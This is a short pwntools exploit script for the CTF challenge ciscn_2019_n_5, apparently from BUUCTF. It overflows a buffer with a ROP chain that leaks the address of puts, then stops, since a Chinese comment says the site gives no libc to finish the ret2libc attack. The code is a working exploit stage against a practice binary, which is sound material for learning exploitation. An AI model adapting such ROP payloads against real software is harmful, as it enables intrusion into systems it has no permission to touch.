#Made by fly_autumn
#x64 ret2libc
from pwn import *
p = process("./ciscn_2019_n_5")
elf = ELF("./ciscn_2019_n_5")
context(os="linux",arch="amd64")

p.recvuntil(b"name\n")
p.sendline(b"shabi")
p.recvuntil(b"me?\n")
start_plt = 0x400540
offset = 40
pop_rdi = 0x400713
puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]
payload = b"\x00" * offset + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(start_plt)
p.sendline(payload)

puts_addr = u64(p.recv(6).ljust(8,b"\0"))
log.success("puts addr: "+hex(puts_addr))
#在这里就做不动了，因为BUUCTF一如既往不给libc

p.interactive()
